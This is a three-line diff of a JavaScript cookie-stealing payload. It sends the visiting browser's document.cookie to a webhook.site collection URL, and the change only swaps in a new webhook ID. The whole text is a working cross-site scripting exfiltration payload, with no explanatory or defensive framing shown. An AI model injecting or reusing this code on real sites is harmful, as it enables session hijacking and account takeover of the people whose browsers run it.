@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://webhook.site/a362bff5-5145-413e-aef3-1f090d81fe73' + document.cookie, true);
+xhttp.open('GET', 'https://webhook.site/a9b27ab7-bd76-4981-bd44-a704ba0a11fc' + document.cookie, true);
 xhttp.send();
